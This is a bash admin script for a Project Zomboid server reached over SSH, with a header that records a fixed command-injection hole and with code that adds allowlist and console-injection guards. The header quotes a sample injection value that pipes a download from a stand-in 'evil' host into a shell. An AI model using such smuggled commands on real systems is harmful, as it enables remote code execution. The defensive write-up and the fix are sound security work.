#!/usr/bin/env bash
# Version: 1.6.0
#
# 1.6.0 — closed a real command-injection RCE found in a security review:
# cmd_sandboxvar()/cmd_sandboxvars() spliced $key/$value unescaped into a
# command string handed to ssh_do() (which becomes the literal remote shell
# command sshd runs) — sed_escape_repl() only escaped sed-replacement
# metacharacters (/, &, \), not shell ones. `sandboxvar 'k=v; curl evil|sh'`
# executed arbitrary code on the box. Fixed with a strict allowlist on both
# key and value rather than trying to escape a shell string correctly (a
# quoting fix is easy to get subtly wrong; SandboxVars keys/values only ever
# take a few known shapes, so allowlisting them is both safer and simpler).
# Also added FIFO-injection guards: pz_console() now refuses a command
# containing a newline (the FIFO is one-command-per-line, so an embedded
# newline in a username/reason/message argument could smuggle in a second,
# unrelated PZ console command), and every user-management argument is
# rejected outright if it contains a literal double quote (would otherwise
# let a crafted reason/message break out of PZ's own "quoted arg" parsing).
#
# Remote admin for the Project Zomboid dedicated server on the Minecraft box
# (192.168.1.221, user muncraft, systemd unit zomboid.service). Modeled on
# v1's HermesAgent/skills/network/minecraft-admin, scoped to what this
# server actually has available: Zomboid does support RCON (RCONPort=27015,
# RCONPassword= in zomboid.ini — same Source RCON protocol Minecraft uses),
# but RCONPassword is blank on this install, which disables it. Rather than
# set an RCON password and open another network-facing admin surface, this
# tool goes through the server's stdin console instead — no port, no
# password, nothing to leak. That console only exists while a process is
# attached to it (screen/tmux) or, as set up here, while zomboid.service's
# stdin is a FIFO
# (/opt/zomboid/server/console.fifo) that a bash wrapper holds open
# read-write for the life of the service — see the ExecStart in
# /etc/systemd/system/zomboid.service on that host. Sending a command is then
# just writing a line to that FIFO and reading the response back out of the
# journal.
#
# Command names and exact syntax (adduser, removeuserfromwhitelist,
# setaccesslevel, banuser, kick, ...) were pulled from the live server's own
# `help` console command (v42.20.2), not guessed — quoting matters (PZ wants
# "username" style double-quoted args) and a couple of names are surprising,
# e.g. the kick command is registered as `kick`, not `kickuser`, despite its
# own help text saying "/kickuser". setaccesslevel is worse: /help advertises
# "Admin, Moderator, Overseer, GM, Observer" but the server actually rejects
# those and wants lowercase (banned/user/priority/observer/gm/moderator/admin,
# no "overseer") — confirmed by triggering its own "unknown access level"
# error message live, not by trusting the help text.
#
# Requires: the `192.168.1.221` SSH host alias in ~/.ssh/config (user
# muncraft, key-based). No credentials live in this script.
set -uo pipefail

HOST="192.168.1.221"
SERVER_DIR="/opt/zomboid/server"
FIFO="$SERVER_DIR/console.fifo"
STEAMCMD="/opt/zomboid/steamcmd/steamcmd.sh"
ACCOUNT_DB="/home/muncraft/Zomboid/db/zomboid.db"
SANDBOX_FILE="/home/muncraft/Zomboid/Server/zomboid_SandboxVars.lua"
INI_FILE="/home/muncraft/Zomboid/Server/zomboid.ini"
SAVE_DIR="/home/muncraft/Zomboid/Saves/Multiplayer/zomboid"

usage() {
  cat <<'EOF'
Usage: hermes-zomboid-admin.sh <command> [args...]

Status / health:
  status                          Service state, ports, resource use, recent errors
  players                         List connected players
  logins                          All known accounts + role + last-connection timestamp
  auditlog                        Recent kick/ban actions (last 20)

Lifecycle:
  start | stop | restart          systemctl the service
  update | upgrade                Stop, steamcmd validate, start

World:
  newworld --confirm               Wipe the current map and start a fresh world with a new
                                    random seed. Whitelist, access levels, and ban/audit
                                    history are untouched (stored separately from the map
                                    save). Old save and zomboid.ini are moved/backed up with
                                    a timestamp, never deleted.

User management:
  adduser <user> [pass]           Add to whitelist (password optional)
  removeuser <user>                Remove from whitelist
  setaccesslevel <user> <level>   banned | user | priority | observer | gm | moderator | admin
                                   (lowercase — the server rejects the
                                   capitalized names its own /help text uses)
  setpassword <user> <newpass>    Change a user's password
  banuser <user> [reason]         Ban (add -ip manually via `console` for IP ban too)
  unbanuser <user>
  kick <user> [reason]

Sandbox settings (zombie spawn rate, loot, etc. — SandboxVars.lua):
  sandboxvars [key ...]           Report current settings: no args dumps the whole
                                   file; one or more names looks up just those keys.
  sandboxvar <key>=<value> [...]  Set one or more keys, back up the file, restart to apply.
                                   Values are raw Lua literals (0.65, true, "text").
                                   Example: sandboxvar PopulationMultiplier=1.2 RespawnHours=24

Other:
  broadcast <message>             servermsg to all connected players
  save                            Save the world now
  console <raw pz command>        Send any raw command verbatim, e.g.:
                                     console 'banuser "rj" -ip -r "spawn kill"'
EOF
}

ssh_do() { ssh -o BatchMode=yes -o ConnectTimeout=8 "$HOST" "$@"; }

# Sends $1 as a PZ console command via the FIFO. Piped through stdin rather
# than interpolated into the remote command string, so callers don't have to
# worry about escaping PZ's own "double-quoted args" syntax for ssh's quoting
# on top of it.
#
# Refuses a command containing an embedded newline: the FIFO is one PZ
# command per line, so a newline inside a caller-supplied value (a kick
# reason, a broadcast message, ...) would otherwise let that value smuggle a
# second, unrelated console command past whatever built $cmd.
pz_console() {
  local cmd="$1"
  case "$cmd" in
    *$'\n'*|*$'\r'*)
      echo "ERROR: refusing to send a console command containing an embedded newline/carriage return (FIFO injection guard)" >&2
      return 1
      ;;
  esac
  echo "$cmd" | ssh_do "cat > $FIFO"
}

# Rejects $1 outright if it contains a literal double quote or an embedded
# newline/carriage return. Applied to every user-supplied username/reason/
# message argument before it's interpolated into a "quoted" PZ console
# command string: an embedded quote would let the value break out of PZ's
# own quoted-argument parsing and start a second token on the same line, and
# a newline would let it start a second command outright (pz_console()
# above also refuses that at the final choke point, but rejecting it here
# too gives a clearer error naming the actual bad argument).
reject_unsafe_console_arg() {
  case "$1" in
    *$'\n'*|*$'\r'*)
      echo "ERROR: argument '$1' contains a newline/carriage return — refused (PZ console injection guard)" >&2
      exit 1
      ;;
    *'"'*)
      echo "ERROR: argument '$1' contains a literal double quote — refused (PZ console injection guard)" >&2
      exit 1
      ;;
  esac
}

# Prints the journal lines logged since $1 (unix epoch seconds) — used right
# after pz_console to fetch just that command's response, not a stale match
# from an earlier boot (journalctl -u accumulates across restarts).
journal_since() {
  local epoch="$1"
  ssh_do "sudo -n journalctl -u zomboid.service --no-pager --since '@${epoch}'"
}

require_arg() {
  if [ -z "${1:-}" ]; then
    echo "ERROR: missing required argument" >&2
    usage >&2
    exit 1
  fi
}

cmd_status() {
  echo "=== zomboid.service ==="
  ssh_do "sudo -n systemctl status zomboid.service --no-pager -l | head -10"
  echo
  echo "=== Listening ports (16261/16262 udp) ==="
  ssh_do "ss -uln 2>/dev/null | grep -E '1626[12]' || echo 'not listening'"
  echo
  echo "=== Resource use ==="
  ssh_do "ps -o pid,rss,%cpu,etime,cmd -C ProjectZomboid64 --no-headers || echo 'process not found'"
  echo
  echo "=== Disk (server dir) ==="
  ssh_do "df -h $SERVER_DIR | tail -1"
  echo
  echo "=== Recent errors (last 200 log lines) ==="
  ssh_do "sudo -n journalctl -u zomboid.service --no-pager -n 200 | grep -iE 'error|exception' | tail -10 || echo 'none'"
  echo
  cmd_players
}

cmd_players() {
  local since
  since=$(ssh_do "date +%s")
  pz_console "players"
  sleep 2
  echo "=== Players ==="
  journal_since "$since" | grep -A1 'command entered.*"players"' | grep -v 'command entered' | tail -5
}

# The account/whitelist data isn't in a flat file like Minecraft's
# whitelist.json — it lives in the server's own SQLite save DB
# ($ACCOUNT_DB), read here via `python3`'s stdlib sqlite3 module since the
# sqlite3 CLI isn't installed on this host. Script piped via stdin (`python3
# -`), same reasoning as pz_console: avoids nesting Python's quoting inside
# ssh's quoting inside bash's quoting.
cmd_logins() {
  ssh_do "python3 -" <<PYEOF
import sqlite3
con = sqlite3.connect("$ACCOUNT_DB")
cur = con.cursor()
cur.execute("""
    SELECT w.username, r.name, w.steamid, w.lastConnection
    FROM whitelist w LEFT JOIN role r ON w.role = r.id
    ORDER BY w.lastConnection IS NULL, w.lastConnection DESC
""")
rows = cur.fetchall()
if not rows:
    print("No accounts.")
else:
    print(f'{"USERNAME":<20} {"ROLE":<10} {"STEAMID":<20} LAST CONNECTION')
    for u, role, sid, last in rows:
        print(f'{u:<20} {(role or "?"):<10} {(sid or "-"):<20} {last or "never"}')
PYEOF
}

cmd_auditlog() {
  ssh_do "python3 -" <<PYEOF
import sqlite3
con = sqlite3.connect("$ACCOUNT_DB")
cur = con.cursor()
cur.execute("SELECT username, type, text, issuedBy, lastUpdate FROM userlog ORDER BY id DESC LIMIT 20")
rows = cur.fetchall()
if not rows:
    print("No audit log entries.")
else:
    for u, typ, text, by, when in rows:
        reason = f" ({text})" if text else ""
        print(f'{when}  {typ:<8} {u:<20} by {by}{reason}')
PYEOF
}

cmd_lifecycle() {
  local action="$1"
  ssh_do "sudo -n systemctl $action zomboid.service"
  echo "$action: done"
  ssh_do "sudo -n systemctl is-active zomboid.service"
}

cmd_update() {
  echo "Stopping service..."
  ssh_do "sudo -n systemctl stop zomboid.service"
  echo "Running steamcmd validate (this can take a while)..."
  ssh_do "$STEAMCMD +force_install_dir $SERVER_DIR +login anonymous +app_update 380870 validate +quit"
  echo "Starting service..."
  ssh_do "sudo -n systemctl start zomboid.service"
  ssh_do "sudo -n systemctl is-active zomboid.service"
}

# Wipes the current map/world and makes the server generate a fresh one (new
# random seed) on next start. Deliberately does NOT touch $ACCOUNT_DB
# (whitelist, roles, ban/audit log all live there, in a directory separate
# from the map save under Saves/Multiplayer/) or anything in zomboid.ini
# besides Seed -- whitelisted users, their access levels, and ban history
# all carry over into the new world untouched. The old save and the prior
# zomboid.ini are moved aside with a timestamp rather than deleted, so a
# reset can be undone by hand if needed.
#
# Recorded exception to IMPLEMENTATION_PLAN.md §5 constraint 5 ("destructive
# actions require a code-level confirmation gate", e.g. hermes-confirm-gate.sh):
# this command is gated by a caller-supplied --confirm flag, not that gate.
# Deliberate, not an oversight — this tool is never wired into either
# persona's tool-calling surface (no SOUL.md/skill grounding gives Sintra or
# Amy a path to invoke it); it is a human-operated admin CLI run directly
# over SSH by The Boss, the same trust model already accepted for
# hermes-synology-ssh.py's constraint-2 exception ("its real safety boundary
# is the scoped account's own limited shell permissions, not anything the
# script itself enforces"). Revisit if this tool is ever exposed to an LLM
# persona's tool surface.
cmd_newworld() {
  if [ "${1:-}" != "--confirm" ]; then
    echo "ERROR: this wipes the current map (terrain, buildings, loot, zombies --" >&2
    echo "everything except accounts/whitelist/bans, which live separately and" >&2
    echo "are preserved). Rerun as: newworld --confirm" >&2
    exit 1
  fi

  echo "=== Current players (server is about to be stopped) ==="
  cmd_players
  echo

  echo "Stopping service..."
  ssh_do "sudo -n systemctl stop zomboid.service"

  local new_seed
  new_seed=$(ssh_do "tr -dc 'A-Za-z0-9' < /dev/urandom | head -c16")
  if [ -z "$new_seed" ]; then
    echo "ERROR: failed to generate a new seed, aborting before touching anything" >&2
    exit 1
  fi

  echo "Backing up zomboid.ini..."
  ssh_do "cp $INI_FILE ${INI_FILE}.bak.\$(date +%Y%m%d-%H%M%S)"

  echo "Setting new seed: $new_seed"
  ssh_do "sed -i -E 's/^Seed=.*/Seed=${new_seed}/' $INI_FILE"

  echo "Moving aside current world save (if any)..."
  ssh_do "if [ -d $SAVE_DIR ]; then mv $SAVE_DIR ${SAVE_DIR}.bak.\$(date +%Y%m%d-%H%M%S); else echo '  no existing save at $SAVE_DIR'; fi"

  echo "Starting service (first boot on a new world can take longer than a normal restart)..."
  ssh_do "sudo -n systemctl start zomboid.service"
  ssh_do "sudo -n systemctl is-active zomboid.service"

  echo
  echo "New world seed: $new_seed"
  echo "Accounts/whitelist/roles/bans preserved untouched ($ACCOUNT_DB)."
}

# Read-only report on the current SandboxVars content — the companion to
# cmd_sandboxvar below, which only ever writes. No args dumps the whole file
# (comment-only and blank lines stripped, ~280 lines on the stock file —
# still just the real settings, nesting/braces kept for context). Named
# args do an exact-key lookup instead. Deliberately a separate, more
# permissive regex than cmd_sandboxvar's write-side validation: it also
# matches table-opener lines like `ZombieLore = {` (no trailing comma),
# which the write path correctly refuses to touch since those aren't
# scalar settings.
cmd_sandboxvars() {
  if [ "$#" -eq 0 ]; then
    ssh_do "grep -vE '^[[:space:]]*(--|\$)' $SANDBOX_FILE"
    return
  fi
  local key line
  for key in "$@"; do
    if ! _valid_sandbox_key "$key"; then
      echo "$key: invalid key format, refused (must be a plain Lua identifier)" >&2
      continue
    fi
    line=$(ssh_do "grep -oE '^[[:space:]]*${key}[[:space:]]*=.*' $SANDBOX_FILE" | xargs)
    if [ -z "$line" ]; then
      echo "$key: not found"
    else
      echo "$line"
    fi
  done
}

# Escapes /, &, and \ so $1 is safe to drop into a sed 's///' replacement.
sed_escape_repl() { printf '%s' "$1" | sed -e 's/[\/&\\]/\\&/g'; }

# --- sandboxvar input validation --------------------------------------
# $key and $value below get spliced into a command string handed to
# ssh_do(), which sends it as the literal remote shell command sshd runs —
# sed_escape_repl() above only neutralizes sed-replacement metacharacters
# (/, &, \), not shell ones (;, `, $(), |, quotes, ...). Rather than try to
# get shell-quoting of an arbitrary string right (easy to get subtly wrong),
# both key and value are checked against a strict allowlist before either
# ever reaches ssh_do(): SandboxVars.lua keys are always plain Lua
# identifiers and values are always one of a bare number, true/false, or a
# plain double-quoted string — nothing else is a legal SandboxVars value
# regardless of caller intent, so this validation costs no real flexibility.
_valid_sandbox_key() {
  [[ "$1" =~ ^[A-Za-z_][A-Za-z0-9_]*$ ]]
}

_valid_sandbox_value() {
  [[ "$1" =~ ^-?[0-9]+(\.[0-9]+)?$ ]] && return 0
  [[ "$1" == "true" || "$1" == "false" ]] && return 0
  [[ "$1" =~ ^\"[A-Za-z0-9\ ,._-]*\"$ ]] && return 0
  return 1
}

# SandboxVars.lua (zombie spawn rate, loot, XP, ...) is only read at server
# startup — unlike zomboid.ini, there's no live `reloadoptions` for it, so
# this always ends in a restart. Takes one or more key=value pairs; every
# key is checked to actually exist in the file *before* anything is
# written, so a typo fails loud instead of silently doing nothing. Values
# are passed through as raw Lua literals (0.65, true, "text") — this
# doesn't attempt to validate them against the key's actual type/range,
# same trust boundary as the PZ console's own `changeoption`.
cmd_sandboxvar() {
  if [ "$#" -eq 0 ]; then
    echo "ERROR: usage: sandboxvar <key>=<value> [<key2>=<value2> ...]" >&2
    exit 1
  fi

  local pair key value current
  echo "=== Validating keys against $SANDBOX_FILE ==="
  for pair in "$@"; do
    key="${pair%%=*}"
    value="${pair#*=}"
    if [ "$key" = "$pair" ] || [ -z "$value" ]; then
      echo "ERROR: bad pair '$pair', expected key=value" >&2
      exit 1
    fi
    if ! _valid_sandbox_key "$key"; then
      echo "ERROR: '$key' is not a valid Lua identifier — refused before touching the file" >&2
      exit 1
    fi
    if ! _valid_sandbox_value "$value"; then
      echo "ERROR: '$value' is not a recognized SandboxVars value shape (number, true/false, or a plain \"quoted string\") — refused before touching the file" >&2
      exit 1
    fi
    current=$(ssh_do "grep -oE '^[[:space:]]*${key}[[:space:]]*=[[:space:]]*[^,]+,' $SANDBOX_FILE")
    if [ -z "$current" ]; then
      echo "ERROR: no key '$key' found in $SANDBOX_FILE (Lua identifiers are case-sensitive — check spelling/case)" >&2
      exit 1
    fi
    echo "  $key: currently '$(echo "$current" | xargs)' -> setting to $value"
  done

  echo "Backing up SandboxVars..."
  ssh_do "cp $SANDBOX_FILE ${SANDBOX_FILE}.bak.\$(date +%Y%m%d-%H%M%S)"

  echo "Applying changes..."
  for pair in "$@"; do
    key="${pair%%=*}"
    value="${pair#*=}"
    local esc_value
    esc_value=$(sed_escape_repl "$value")
    ssh_do "sed -i -E 's/^([[:space:]]*)${key}([[:space:]]*=[[:space:]]*)[^,]+,/\1${key}\2${esc_value},/' $SANDBOX_FILE"
  done

  echo "Restarting service to load the new SandboxVars (they're read only at startup)..."
  cmd_lifecycle restart
}

cmd_console() {
  require_arg "${1:-}"
  local since
  since=$(ssh_do "date +%s")
  pz_console "$1"
  sleep 2
  journal_since "$since" | grep -v 'command entered via server console'
}

case "${1:-}" in
  status|health)      cmd_status ;;
  players)             cmd_players ;;
  logins)               cmd_logins ;;
  auditlog)             cmd_auditlog ;;
  start)                cmd_lifecycle start ;;
  stop)                 cmd_lifecycle stop ;;
  restart)              cmd_lifecycle restart ;;
  update|upgrade)      cmd_update ;;
  newworld)
    shift
    cmd_newworld "$@"
    ;;
  sandboxvars)
    shift
    cmd_sandboxvars "$@"
    ;;
  sandboxvar)
    shift
    cmd_sandboxvar "$@"
    ;;
  console)
    require_arg "${2:-}"
    reject_unsafe_console_arg "$2"
    cmd_console "$2"
    ;;
  adduser)
    require_arg "${2:-}"
    reject_unsafe_console_arg "$2"
    if [ -n "${3:-}" ]; then
      reject_unsafe_console_arg "$3"
      cmd_console "adduser \"$2\" \"$3\""
    else
      cmd_console "adduser \"$2\""
    fi
    ;;
  removeuser)
    require_arg "${2:-}"
    reject_unsafe_console_arg "$2"
    cmd_console "removeuserfromwhitelist \"$2\""
    ;;
  setaccesslevel)
    require_arg "${2:-}"; require_arg "${3:-}"
    reject_unsafe_console_arg "$2"; reject_unsafe_console_arg "$3"
    cmd_console "setaccesslevel \"$2\" \"$3\""
    ;;
  setpassword)
    require_arg "${2:-}"; require_arg "${3:-}"
    reject_unsafe_console_arg "$2"; reject_unsafe_console_arg "$3"
    cmd_console "setpassword \"$2\" \"$3\""
    ;;
  banuser)
    require_arg "${2:-}"
    reject_unsafe_console_arg "$2"
    if [ -n "${3:-}" ]; then
      reject_unsafe_console_arg "$3"
      cmd_console "banuser \"$2\" -r \"$3\""
    else
      cmd_console "banuser \"$2\""
    fi
    ;;
  unbanuser)
    require_arg "${2:-}"
    reject_unsafe_console_arg "$2"
    cmd_console "unbanuser \"$2\""
    ;;
  kick)
    require_arg "${2:-}"
    reject_unsafe_console_arg "$2"
    if [ -n "${3:-}" ]; then
      reject_unsafe_console_arg "$3"
      cmd_console "kick \"$2\" -r \"$3\""
    else
      cmd_console "kick \"$2\""
    fi
    ;;
  broadcast)
    require_arg "${2:-}"
    reject_unsafe_console_arg "$2"
    cmd_console "servermsg \"$2\""
    ;;
  save)
    cmd_console "save"
    ;;
  *)
    usage
    exit 1
    ;;
esac
